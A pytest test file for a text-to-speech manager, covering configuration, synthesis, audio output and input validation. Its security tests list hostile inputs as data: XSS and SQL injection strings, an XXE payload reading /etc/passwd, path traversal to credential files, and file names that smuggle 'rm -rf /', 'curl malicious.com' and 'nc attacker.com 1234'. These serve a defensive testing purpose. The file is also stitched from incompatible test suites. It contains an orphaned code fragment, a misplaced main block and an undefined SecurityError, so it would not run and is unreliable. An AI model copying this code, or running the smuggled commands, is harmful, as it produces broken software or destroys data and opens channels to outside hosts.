"""
Comprehensive unit tests for TTS Manager.
Testing Framework: pytest
"""

import pytest
import asyncio
import unittest.mock as mock
from unittest.mock import Mock, AsyncMock, patch, MagicMock, call
import tempfile
import os
import json
import time
from pathlib import Path
from typing import Dict, List, Any, Optional

# Import TTS manager and related classes
# Note: Adjust imports based on actual implementation structure
try:
    from CharacterClient.tts_manager import TTSManager, TTSConfig, AudioFormat
    from CharacterClient.exceptions import TTSError, AudioError, ConfigurationError
except ImportError:
    # Create mock classes for testing if imports fail
    class TTSManager:
        def __init__(self, config=None):
            self.config = config or {}
        
        def synthesize_speech(self, text: str) -> bytes:
            return b'mock_audio_data'
        
        def save_audio(self, text: str, filepath: str) -> None:
            pass
    
    class TTSError(Exception):
        pass
    
    class AudioError(Exception):
        pass
    
    class ConfigurationError(Exception):
        pass


class TestTTSManagerInitialization:
    """Test TTS Manager initialization and configuration."""
    
    def test_default_initialization(self):
        """Test TTS manager initializes with default settings."""
        tts_manager = TTSManager()
        assert tts_manager is not None
        assert hasattr(tts_manager, 'config')
    
    def test_custom_config_initialization(self):
        """Test TTS manager initializes with custom configuration."""
        config = {
            'voice': 'en-US-AriaNeural',
            'speed': 1.2,
            'pitch': 1.0,
            'volume': 0.8,
            'format': 'wav'
        }
        tts_manager = TTSManager(config=config)
        assert tts_manager.config.get('voice') == 'en-US-AriaNeural'
        assert tts_manager.config.get('speed') == 1.2
    
    @pytest.mark.parametrize("invalid_config,expected_error", [
        ({'speed': -1.0}, (ValueError, ConfigurationError)),
        ({'speed': 5.0}, (ValueError, ConfigurationError)),
        ({'pitch': -3.0}, (ValueError, ConfigurationError)),
        ({'pitch': 4.0}, (ValueError, ConfigurationError)),
        ({'volume': -0.1}, (ValueError, ConfigurationError)),
        ({'volume': 2.0}, (ValueError, ConfigurationError)),
        ({'format': 'invalid_format'}, (ValueError, ConfigurationError)),
    ])
    def test_invalid_config_validation(self, invalid_config, expected_error):
        """Test TTS manager validates configuration parameters."""
        with pytest.raises(expected_error):
            TTSManager(config=invalid_config)
    
    def test_config_merge_with_defaults(self):
        """Test configuration merges with default values."""
        partial_config = {'voice': 'custom_voice'}
        tts_manager = TTSManager(config=partial_config)
        
        # Should have custom voice but default other values
        assert tts_manager.config.get('voice') == 'custom_voice'
        # Assuming default speed exists
        assert 'speed' in tts_manager.config or hasattr(tts_manager, '_default_speed')


class TestTTSManagerTextProcessing:
    """Test text processing and synthesis functionality."""
    
    @pytest.fixture
    def tts_manager(self):
        """Create a TTS manager instance for testing."""
        return TTSManager()
    
    def test_synthesize_simple_text(self, tts_manager):
        """Test synthesizing speech from simple text."""
        text = "Hello, world!"
        with patch.object(tts_manager, 'synthesize_speech', return_value=b'fake_audio') as mock_synth:
            result = tts_manager.synthesize_speech(text)
            assert result == b'fake_audio'
            mock_synth.assert_called_once_with(text)
    
    @pytest.mark.parametrize("invalid_input", [
        "",           # Empty string
        None,         # None value
        123,          # Non-string type
        [],           # List
        {},           # Dictionary
    ])
    def test_synthesize_invalid_input(self, tts_manager, invalid_input):
        """Test synthesizing speech with invalid inputs."""
        with pytest.raises((ValueError, TypeError, TTSError)):
            tts_manager.synthesize_speech(invalid_input)
    
    def test_synthesize_very_long_text(self, tts_manager):
        """Test synthesizing speech with very long text."""
        long_text = "This is a test sentence. " * 1000
        with patch.object(tts_manager, 'synthesize_speech', return_value=b'long_audio') as mock_synth:
            result = tts_manager.synthesize_speech(long_text)
            assert result is not None
            assert len(result) > 0
    
    @pytest.mark.parametrize("special_text", [
        "Hello! How are you? I'm fine.",
        "Test with numbers: 123 456 789",
        "Special chars: @#$%^&*()",
        "Unicode: café naïve résumé",
        "URLs: https://example.com/path?param=value",
        "Email: test@example.com",
        "Phone: +1-555-123-4567",
        "Multiple\nlines\nof\ntext",
    ])
    def test_synthesize_special_characters(self, tts_manager, special_text):
        """Test synthesizing speech with special characters and formats."""
        with patch.object(tts_manager, 'synthesize_speech', return_value=b'special_audio') as mock_synth:
            result = tts_manager.synthesize_speech(special_text)
            assert result is not None
    
    def test_text_preprocessing(self, tts_manager):
        """Test text preprocessing functionality."""
        if hasattr(tts_manager, 'preprocess_text'):
            test_cases = [
                ("Hello\n\nworld", "Hello world"),
                ("Multiple   spaces", "Multiple spaces"),
                ("CAPS LOCK TEXT", "CAPS LOCK TEXT"),  # May or may not be lowercased
                ("Tabs\t\tand\tspaces", "Tabs and spaces"),
            ]
            
            for input_text, expected_pattern in test_cases:
                result = tts_manager.preprocess_text(input_text)
                assert isinstance(result, str)
                assert len(result.strip()) > 0
    
    def test_text_chunking_for_long_input(self, tts_manager):
        """Test text chunking for very long inputs."""
        if hasattr(tts_manager, 'chunk_text'):
            very_long_text = "This is a test sentence. " * 500
            chunks = tts_manager.chunk_text(very_long_text, max_length=1000)
            
            assert isinstance(chunks, list)
            assert len(chunks) > 1
            for chunk in chunks:
                assert len(chunk) <= 1000
                assert isinstance(chunk, str)


class TestTTSManagerAudioOutput:
    """Test audio output functionality."""
    
    @pytest.fixture
    def tts_manager(self):
        return TTSManager()
    
    def test_save_audio_to_file(self, tts_manager):
        """Test saving synthesized audio to file."""
        text = "Test audio save"
        audio_data = b'fake_audio_data'
        
        with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as temp_file:
            temp_path = temp_file.name
        
        try:
            with patch.object(tts_manager, 'synthesize_speech', return_value=audio_data):
                tts_manager.save_audio(text, temp_path)
                
                assert os.path.exists(temp_path)
                assert os.path.getsize(temp_path) > 0
        finally:
            if os.path.exists(temp_path):
                os.unlink(temp_path)
    
    @pytest.mark.parametrize("invalid_path", [
        "/invalid/path/that/does/not/exist/audio.wav",
        "",
        None,
        "/root/protected/path.wav",  # Permission denied
    ])
    def test_save_audio_invalid_paths(self, tts_manager, invalid_path):
        """Test saving audio to invalid paths raises appropriate errors."""
        with pytest.raises((IOError, OSError, AudioError, ValueError, TypeError)):
            tts_manager.save_audio("Test text", invalid_path)
    
    def test_get_supported_formats(self, tts_manager):
        """Test getting supported audio formats."""
        if hasattr(tts_manager, 'get_supported_formats'):
            formats = tts_manager.get_supported_formats()
            assert isinstance(formats, (list, tuple, set))
            assert len(formats) > 0
            
            # Common formats should be strings
            for format_type in formats:
                assert isinstance(format_type, str)
                assert len(format_type) > 0
    
    @pytest.mark.parametrize("audio_format", ['wav', 'mp3', 'ogg', 'flac'])
    def test_audio_format_conversion(self, tts_manager, audio_format):
        """Test audio format conversion functionality."""
        if hasattr(tts_manager, 'convert_format'):
            audio_data = b'fake_audio_data'
            
            try:
                result = tts_manager.convert_format(audio_data, audio_format)
                assert isinstance(result, bytes)
                assert len(result) > 0
            except (NotImplementedError, ValueError):
                # Format might not be supported
                pytest.skip(f"Format {audio_format} not supported")
    
    def test_audio_quality_settings(self, tts_manager):
        """Test audio quality and bitrate settings."""
        if hasattr(tts_manager, 'set_audio_quality'):
            quality_levels = ['low', 'medium', 'high']
            
            for quality in quality_levels:
                try:
                    tts_manager.set_audio_quality(quality)
                    if hasattr(tts_manager, 'get_audio_quality'):
                        assert tts_manager.get_audio_quality() == quality
                except (ValueError, NotImplementedError):
                    # Quality setting might not be supported
                    pass


        mock_tts_instance = Mock()
        mock_coqui.return_value = mock_tts_instance
        mock_to_thread.return_value = None
        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="test_model"
        )
        
        result = await manager.synthesize("Hello world", "test_output.wav", "/path/to/speaker.wav")
        
        assert result == "/tmp/test_audio/test_output.wav"
        mock_to_thread.assert_called_once()
        
    @patch('tts_manager.ensure_client_directories')
    async def test_synthesize_not_initialized(self, mock_ensure_dirs, capsys):
        """Test async synthesis when not initialized"""
        manager = TTSManager(tts_service_name="unsupported")
        result = await manager.synthesize("Hello world", "test_output.wav")
        
        assert result is None
        captured = capsys.readouterr()
        assert "Not initialized" in captured.out
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('asyncio.to_thread')
    async def test_synthesize_exception_handling(self, mock_to_thread, mock_gtts, mock_ensure_dirs, capsys):
        """Test async synthesis exception handling"""
        mock_to_thread.side_effect = Exception("Synthesis failed")
        
        manager = TTSManager(tts_service_name="gtts")
        result = await manager.synthesize("Hello world", "test_output.mp3")
        
        assert result is None
        captured = capsys.readouterr()
        assert "Error during async TTS synthesis" in captured.out
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('asyncio.to_thread')
    @patch('os.path.exists', return_value=True)
    @patch('os.remove')
    async def test_synthesize_cleanup_on_error(self, mock_remove, mock_exists, mock_to_thread, mock_gtts, mock_ensure_dirs):
        """Test file cleanup on synthesis error"""
        mock_to_thread.side_effect = Exception("Synthesis failed")
        
        manager = TTSManager(tts_service_name="gtts")
        await manager.synthesize("Hello world", "test_output.mp3")
        
        mock_remove.assert_called_once()
        
    @patch('tts_manager.ensure_client_directories')
    async def test_synthesize_unsupported_service(self, mock_ensure_dirs, capsys):
        """Test async synthesis with unsupported service"""
        manager = TTSManager(tts_service_name="unsupported")
        manager.is_initialized = True  # Force initialized state
        manager.tts_instance = Mock()
        
        result = await manager.synthesize("Hello world", "test_output.wav")
        
        assert result is None
        captured = capsys.readouterr()
        assert "No async synthesis method" in captured.out


class TestTTSManagerStaticMethods:
    """Test suite for static methods"""
    
    @patch('tts_manager.gtts')
    @patch('tts_manager.CoquiTTS')
    def test_list_services_both_available(self, mock_coqui, mock_gtts):
        """Test listing services when both are available"""
        services = TTSManager.list_services()
        assert "gtts" in services
        assert "xttsv2" in services
        assert len(services) == 2
        
    @patch('tts_manager.gtts')
    @patch('tts_manager.CoquiTTS', None)
    def test_list_services_only_gtts(self, mock_gtts):
        """Test listing services when only gTTS is available"""
        services = TTSManager.list_services()
        assert "gtts" in services
        assert "xttsv2" not in services
        assert len(services) == 1
        
    @patch('tts_manager.gtts', None)
    @patch('tts_manager.CoquiTTS')
    def test_list_services_only_xttsv2(self, mock_coqui):
        """Test listing services when only XTTSv2 is available"""
        services = TTSManager.list_services()
        assert "gtts" not in services
        assert "xttsv2" in services
        assert len(services) == 1
        
    @patch('tts_manager.gtts', None)
    @patch('tts_manager.CoquiTTS', None)
    def test_list_services_none_available(self):
        """Test listing services when none are available"""
        services = TTSManager.list_services()
        assert len(services) == 0
        
    def test_get_available_models_gtts(self):
        """Test getting available models for gTTS"""
        models = TTSManager.get_available_models("gtts")
        assert models == ["N/A (uses language codes)"]
        
    def test_get_available_models_xttsv2(self):
        """Test getting available models for XTTSv2"""
        models = TTSManager.get_available_models("xttsv2")
        assert "tts_models/multilingual/multi-dataset/xtts_v2" in models
        
    def test_get_available_models_unsupported(self):
        """Test getting available models for unsupported service"""
        models = TTSManager.get_available_models("unsupported")
        assert models == []


class TestTTSManagerModelHandling:
    """Test suite for model handling functionality"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CLIENT_TTS_MODELS_PATH', '/tmp/test_models')
    @patch('os.makedirs')
    def test_get_or_download_model_blocking_xttsv2(self, mock_makedirs, mock_ensure_dirs):
        """Test model handling for XTTSv2"""
        manager = TTSManager(tts_service_name="gtts")  # Any service for testing
        result = manager._get_or_download_model_blocking("xttsv2", "test_model")
        
        assert result == "test_model"
        mock_makedirs.assert_called()
        
    @patch('tts_manager.ensure_client_directories')
    def test_get_or_download_model_blocking_unsupported(self, mock_ensure_dirs):
        """Test model handling for unsupported service"""
        manager = TTSManager(tts_service_name="gtts")
        result = manager._get_or_download_model_blocking("unsupported", "test_model")
        
        assert result is None


class TestTTSManagerEdgeCases:
    """Test suite for edge cases and error conditions"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_empty_text(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with empty text"""
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            result = await manager.synthesize("", "output.mp3")
            # Should still attempt synthesis - TTS service handles empty text
            mock_to_thread.assert_called_once()
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_very_long_text(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with very long text"""
        long_text = "A" * 10000
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            await manager.synthesize(long_text, "output.mp3")
            mock_to_thread.assert_called_once()
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_special_characters(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with special characters"""
        special_text = "Hello! 👋 How are you? 🤔 Fine, thanks! 😊"
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            await manager.synthesize(special_text, "output.mp3")
            mock_to_thread.assert_called_once()
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_none_filename(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with None filename"""
        manager = TTSManager(tts_service_name="gtts")
        
        # This should raise an exception due to os.path.join with None
        with pytest.raises((TypeError, AttributeError)):
            await manager.synthesize("Hello", None)
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_invalid_filename(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with invalid filename characters"""
        manager = TTSManager(tts_service_name="gtts")
        invalid_filename = "output<>:\"|?*.mp3"
        
        with patch('asyncio.to_thread') as mock_to_thread:
            await manager.synthesize("Hello", invalid_filename)
            # Should still attempt - OS handles invalid filenames
            mock_to_thread.assert_called_once()


class TestTTSManagerLanguageHandling:
    """Test suite for language-specific functionality"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_initialization_various_languages(self, mock_gtts, mock_ensure_dirs):
        """Test initialization with various language codes"""
        languages = ["en", "es", "fr", "de", "it", "pt", "ru", "ja", "ko", "zh"]
        
        for lang in languages:
            manager = TTSManager(tts_service_name="gtts", language=lang)
            assert manager.language == lang
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_initialization_invalid_language_code(self, mock_gtts, mock_ensure_dirs):
        """Test initialization with invalid language code"""
        manager = TTSManager(tts_service_name="gtts", language="invalid_lang")
        assert manager.language == "invalid_lang"  # Should accept any string
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_initialization_empty_language(self, mock_gtts, mock_ensure_dirs):
        """Test initialization with empty language string"""
        manager = TTSManager(tts_service_name="gtts", language="")
        assert manager.language == "en"  # Should default to "en"


class TestTTSManagerConcurrency:
    """Test suite for concurrent operations"""
    
    @patch('tts_manager.ensure_client_directories')  
    @patch('tts_manager.gtts')
    async def test_concurrent_synthesis_requests(self, mock_gtts, mock_ensure_dirs):
        """Test handling multiple concurrent synthesis requests"""
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            
            # Create multiple concurrent synthesis tasks
            tasks = []
            for i in range(5):
                task = manager.synthesize(f"Text {i}", f"output_{i}.mp3")
                tasks.append(task)
                
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # All should complete successfully
            assert len(results) == 5
            assert all(r is not None for r in results if not isinstance(r, Exception))
            assert mock_to_thread.call_count == 5


class TestTTSManagerFileSystemOperations:
    """Test suite for file system related operations"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('os.makedirs', side_effect=PermissionError("Permission denied"))
    async def test_synthesize_makedirs_permission_error(self, mock_makedirs, mock_gtts, mock_ensure_dirs):
        """Test synthesis when directory creation fails due to permissions"""
        manager = TTSManager(tts_service_name="gtts")
        
        with pytest.raises(PermissionError):
            await manager.synthesize("Hello", "output.mp3")
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('os.remove', side_effect=OSError("Removal failed"))
    @patch('os.path.exists', return_value=True)
    @patch('asyncio.to_thread', side_effect=Exception("Synthesis failed"))
    async def test_synthesize_cleanup_failure(self, mock_to_thread, mock_exists, mock_remove, mock_gtts, mock_ensure_dirs):
        """Test synthesis cleanup when file removal fails"""
        manager = TTSManager(tts_service_name="gtts")
        
        # Should not raise exception even if cleanup fails
        result = await manager.synthesize("Hello", "output.mp3")
        assert result is None
        mock_remove.assert_called_once()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])

class TestTTSManagerPerformanceAndStress:
    """Test suite for performance and stress testing"""
    
    @pytest.fixture
    def tts_manager(self):
        return TTSManager()
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_high_volume_concurrent_requests(self, mock_gtts, mock_ensure_dirs):
        """Test handling high volume of concurrent synthesis requests"""
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            
            # Create 50 concurrent synthesis tasks
            tasks = []
            for i in range(50):
                task = manager.synthesize(f"Performance test text {i}", f"perf_output_{i}.mp3")
                tasks.append(task)
                
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            assert len(results) == 50
            assert mock_to_thread.call_count == 50
            
    def test_memory_usage_large_text_processing(self, tts_manager):
        """Test memory usage with very large text inputs"""
        # Create a 1MB text string
        large_text = "This is a performance test sentence. " * 25000
        
        import sys
        if hasattr(sys, 'getsizeof'):
            text_size = sys.getsizeof(large_text)
            assert text_size > 1000000  # Verify it's actually large
        
        with patch.object(tts_manager, 'synthesize_speech', return_value=b'large_audio') as mock_synth:
            result = tts_manager.synthesize_speech(large_text)
            assert result is not None
            mock_synth.assert_called_once()
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesis_timeout_handling(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis timeout scenarios"""
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.side_effect = asyncio.TimeoutError("Request timed out")
            
            result = await manager.synthesize("Timeout test", "timeout_output.mp3")
            assert result is None
    
    def test_repeated_synthesis_same_text(self, tts_manager):
        """Test repeated synthesis of the same text for caching behavior"""
        text = "Repeated synthesis test"
        
        with patch.object(tts_manager, 'synthesize_speech', return_value=b'cached_audio') as mock_synth:
            # Synthesize the same text multiple times
            for _ in range(10):
                result = tts_manager.synthesize_speech(text)
                assert result == b'cached_audio'
            
            # Should be called 10 times unless caching is implemented
            assert mock_synth.call_count >= 1


class TestTTSManagerSecurityAndValidation:
    """Test suite for security and input validation"""
    
    @pytest.fixture
    def tts_manager(self):
        return TTSManager()
    
    @pytest.mark.parametrize("malicious_input", [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
        "\x00\x01\x02\x03\x04\x05",  # Binary data
        "A" * 1000000,  # Extremely long input
        "\n" * 10000,   # Many newlines
        "🏴‍☠️💀🔥" * 1000,  # Many unicode emojis
    ])
    def test_malicious_input_handling(self, tts_manager, malicious_input):
        """Test handling of potentially malicious inputs"""
        with patch.object(tts_manager, 'synthesize_speech', return_value=b'safe_audio') as mock_synth:
            try:
                result = tts_manager.synthesize_speech(malicious_input)
                # Should either succeed safely or raise appropriate exception
                assert result is not None or True  # Either works or raises exception
            except (ValueError, TypeError, TTSError, UnicodeError):
                # These exceptions are acceptable for malicious inputs
                pass
    
    @pytest.mark.parametrize("malicious_path", [
        "../../../etc/passwd",
        "/etc/shadow",
        "C:\\Windows\\System32\\config\\SAM",
        "file:///etc/passwd",
        "\\\\server\\share\\file.txt",
        "output.wav; rm -rf /",
        "output.wav && curl malicious.com",
        "output.wav | nc attacker.com 1234",
        "\x00output.wav",
        "output.wav\x00.txt",
    ])
    def test_malicious_file_path_handling(self, tts_manager, malicious_path):
        """Test handling of potentially malicious file paths"""
        with pytest.raises((ValueError, OSError, IOError, SecurityError, AudioError)):
            tts_manager.save_audio("Test text", malicious_path)
    
    def test_input_sanitization(self, tts_manager):
        """Test input sanitization functionality"""
        if hasattr(tts_manager, 'sanitize_input'):
            test_cases = [
                ("<script>alert('xss')</script>", "alert('xss')"),
                ("Hello\x00World", "HelloWorld"),
                ("Normal text", "Normal text"),
                ("", ""),
            ]
            
            for input_text, expected_pattern in test_cases:
                result = tts_manager.sanitize_input(input_text)
                assert isinstance(result, str)
                assert len(result) <= len(input_text)
    
    def test_configuration_security_validation(self):
        """Test security validation in configuration"""
        dangerous_configs = [
            {'voice': '../../../etc/passwd'},
            {'output_path': '/etc/shadow'},
            {'temp_dir': '$(rm -rf /)'},
            {'custom_command': 'curl malicious.com'},
        ]
        
        for config in dangerous_configs:
            with pytest.raises((ValueError, SecurityError, ConfigurationError)):
                TTSManager(config=config)


class TestTTSManagerRobustness:
    """Test suite for robustness and error recovery"""
    
    @pytest.fixture
    def tts_manager(self):
        return TTSManager()
    
    def test_corrupted_audio_data_handling(self, tts_manager):
        """Test handling of corrupted audio data"""
        if hasattr(tts_manager, 'validate_audio'):
            corrupted_data = b'\x00\xFF' * 1000  # Corrupted binary data
            
            with pytest.raises((AudioError, ValueError)):
                tts_manager.validate_audio(corrupted_data)
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_network_interruption_recovery(self, mock_gtts, mock_ensure_dirs):
        """Test recovery from network interruptions"""
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            # Simulate network error followed by success
            mock_to_thread.side_effect = [
                ConnectionError("Network error"),
                None  # Success on retry
            ]
            
            # Should handle network error gracefully
            result = await manager.synthesize("Network test", "network_output.mp3")
            # Result depends on retry logic implementation
            mock_to_thread.assert_called()
    
    def test_disk_space_exhaustion_handling(self, tts_manager):
        """Test handling when disk space is exhausted"""
        with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as temp_file:
            temp_path = temp_file.name
        
        try:
            with patch('builtins.open', side_effect=OSError("No space left on device")):
                with pytest.raises((OSError, IOError, AudioError)):
                    tts_manager.save_audio("Test text", temp_path)
        finally:
            if os.path.exists(temp_path):
                os.unlink(temp_path)
    
    def test_unicode_normalization_handling(self, tts_manager):
        """Test handling of various Unicode normalization forms"""
        import unicodedata
        
        test_text = "café naïve résumé"
        
        # Test different normalization forms
        nfc_text = unicodedata.normalize('NFC', test_text)
        nfd_text = unicodedata.normalize('NFD', test_text)
        nfkc_text = unicodedata.normalize('NFKC', test_text)
        nfkd_text = unicodedata.normalize('NFKD', test_text)
        
        for normalized_text in [nfc_text, nfd_text, nfkc_text, nfkd_text]:
            with patch.object(tts_manager, 'synthesize_speech', return_value=b'unicode_audio'):
                result = tts_manager.synthesize_speech(normalized_text)
                assert result is not None


class TestTTSManagerLoggingAndMonitoring:
    """Test suite for logging and monitoring functionality"""
    
    @pytest.fixture
    def tts_manager(self):
        return TTSManager()
    
    def test_synthesis_metrics_collection(self, tts_manager):
        """Test collection of synthesis metrics"""
        if hasattr(tts_manager, 'get_metrics'):
            with patch.object(tts_manager, 'synthesize_speech', return_value=b'metrics_audio'):
                # Perform some operations
                tts_manager.synthesize_speech("Metrics test 1")
                tts_manager.synthesize_speech("Metrics test 2")
                
                metrics = tts_manager.get_metrics()
                assert isinstance(metrics, dict)
                assert 'synthesis_count' in metrics or 'total_requests' in metrics
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_async_operation_logging(self, mock_gtts, mock_ensure_dirs, caplog):
        """Test logging of async operations"""
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            
            await manager.synthesize("Logging test", "log_output.mp3")
            
            # Check if any logging occurred (implementation dependent)
            log_messages = [record.message for record in caplog.records]
            # At minimum, should not crash
            assert True
    
    def test_error_reporting_detail(self, tts_manager):
        """Test detailed error reporting"""
        with patch.object(tts_manager, 'synthesize_speech', side_effect=Exception("Detailed error")):
            try:
                tts_manager.synthesize_speech("Error test")
            except Exception as e:
                # Should provide meaningful error information
                assert len(str(e)) > 0
                assert "error" in str(e).lower() or "Error" in str(e)


class TestTTSManagerAdvancedFeatures:
    """Test suite for advanced features and edge cases"""
    
    @pytest.fixture
    def tts_manager(self):
        return TTSManager()
    
    def test_streaming_synthesis_if_available(self, tts_manager):
        """Test streaming synthesis functionality if available"""
        if hasattr(tts_manager, 'synthesize_streaming'):
            text = "Streaming test sentence"
            
            stream = tts_manager.synthesize_streaming(text)
            
            # Should return some kind of iterable/generator
            assert hasattr(stream, '__iter__') or hasattr(stream, '__next__')
    
    def test_voice_cloning_if_available(self, tts_manager):
        """Test voice cloning functionality if available"""
        if hasattr(tts_manager, 'clone_voice'):
            with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as temp_file:
                temp_path = temp_file.name
                temp_file.write(b'fake_voice_sample')
            
            try:
                with patch.object(tts_manager, 'clone_voice', return_value=True):
                    result = tts_manager.clone_voice(temp_path, "speaker_id")
                    assert result is not None
            finally:
                if os.path.exists(temp_path):
                    os.unlink(temp_path)
    
    def test_prosody_control_if_available(self, tts_manager):
        """Test prosody control features if available"""
        if hasattr(tts_manager, 'set_prosody'):
            prosody_params = {
                'rate': 1.2,
                'pitch': '+10%',
                'volume': 0.8,
                'emphasis': 'strong'
            }
            
            try:
                tts_manager.set_prosody(prosody_params)
                if hasattr(tts_manager, 'get_prosody'):
                    current_prosody = tts_manager.get_prosody()
                    assert isinstance(current_prosody, dict)
            except (NotImplementedError, ValueError):
                # Feature might not be supported
                pass
    
    def test_ssml_processing_if_available(self, tts_manager):
        """Test SSML (Speech Synthesis Markup Language) processing"""
        ssml_text = '''
        <speak>
            <prosody rate="slow" pitch="low">
                This is slow and low.
            </prosody>
            <break time="1s"/>
            <prosody rate="fast" pitch="high">
                This is fast and high!
            </prosody>
        </speak>
        '''
        
        with patch.object(tts_manager, 'synthesize_speech', return_value=b'ssml_audio') as mock_synth:
            try:
                result = tts_manager.synthesize_speech(ssml_text)
                assert result is not None
            except (NotImplementedError, ValueError):
                # SSML might not be supported
                pytest.skip("SSML not supported")


class TestTTSManagerCompatibility:
    """Test suite for compatibility and version handling"""
    
    def test_backward_compatibility_old_config_format(self):
        """Test backward compatibility with old configuration formats"""
        old_config_formats = [
            # Legacy string-based config
            "en-US-AriaNeural",
            # Legacy tuple config
            ("gtts", "en"),
            # Legacy list config
            ["voice", "speed", "pitch"]
        ]
        
        for old_config in old_config_formats:
            try:
                manager = TTSManager(config=old_config)
                assert manager is not None
            except (TypeError, ValueError, ConfigurationError):
                # Old format might not be supported
                pass
    
    def test_api_version_compatibility(self):
        """Test API version compatibility"""
        if hasattr(TTSManager, 'get_api_version'):
            version = TTSManager.get_api_version()
            assert isinstance(version, (str, tuple))
            assert len(str(version)) > 0
    
    def test_feature_detection(self):
        """Test feature detection capabilities"""
        features_to_check = [
            'streaming',
            'voice_cloning', 
            'ssml_support',
            'prosody_control',
            'format_conversion',
            'batch_processing'
        ]
        
        for feature in features_to_check:
            if hasattr(TTSManager, f'supports_{feature}'):
                support_result = getattr(TTSManager, f'supports_{feature}')()
                assert isinstance(support_result, bool)


class TestTTSManagerBoundaryConditions:
    """Test suite for boundary conditions and limits"""
    
    @pytest.fixture
    def tts_manager(self):
        return TTSManager()
    
    @pytest.mark.parametrize("boundary_value", [
        0,      # Zero
        -1,     # Negative
        1,      # Minimum positive
        2**16,  # Large value
        2**32,  # Very large value
        float('inf'),  # Infinity
        float('-inf'), # Negative infinity
    ])
    def test_numeric_parameter_boundaries(self, tts_manager, boundary_value):
        """Test numeric parameter boundary conditions"""
        if hasattr(tts_manager, 'set_speed'):
            try:
                tts_manager.set_speed(boundary_value)
            except (ValueError, OverflowError, ConfigurationError):
                # Expected for invalid boundary values
                pass
    
    def test_text_length_boundaries(self, tts_manager):
        """Test text length boundary conditions"""
        boundary_texts = [
            "",                    # Empty
            "a",                   # Single character
            "a" * 1000,           # Moderate length
            "a" * 100000,         # Long text
            "a" * 1000000,        # Very long text
        ]
        
        for text in boundary_texts:
            with patch.object(tts_manager, 'synthesize_speech', return_value=b'boundary_audio'):
                try:
                    result = tts_manager.synthesize_speech(text)
                    assert result is not None or text == ""  # Empty might return None
                except (ValueError, TTSError, MemoryError):
                    # Some lengths might not be supported
                    pass
    
    def test_file_size_boundaries(self, tts_manager):
        """Test audio file size boundary handling"""
        if hasattr(tts_manager, 'validate_file_size'):
            boundary_sizes = [0, 1, 1024, 1024*1024, 1024*1024*100]  # 0B to 100MB
            
            for size in boundary_sizes:
                try:
                    result = tts_manager.validate_file_size(size)
                    assert isinstance(result, bool)
                except (ValueError, NotImplementedError):
                    pass


class TestTTSManagerServiceSpecificBehavior:
    """Test suite for service-specific behavior and integration"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('tts_manager.CoquiTTS')
    def test_gtts_specific_functionality(self, mock_coqui, mock_gtts, mock_ensure_dirs):
        """Test gTTS service specific functionality"""
        manager = TTSManager(tts_service_name="gtts", language="fr")
        assert manager.service_name == "gtts"
        assert manager.language == "fr"
        
        # Test language validation
        valid_languages = ["en", "es", "fr", "de", "it", "pt", "ru", "ja", "ko", "zh"]
        for lang in valid_languages:
            manager_lang = TTSManager(tts_service_name="gtts", language=lang)
            assert manager_lang.language == lang
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('tts_manager.CoquiTTS')
    def test_xttsv2_specific_functionality(self, mock_coqui, mock_gtts, mock_ensure_dirs):
        """Test XTTSv2 service specific functionality"""
        mock_tts_instance = Mock()
        mock_coqui.return_value = mock_tts_instance
        mock_tts_instance.languages = ["en", "es", "fr"]
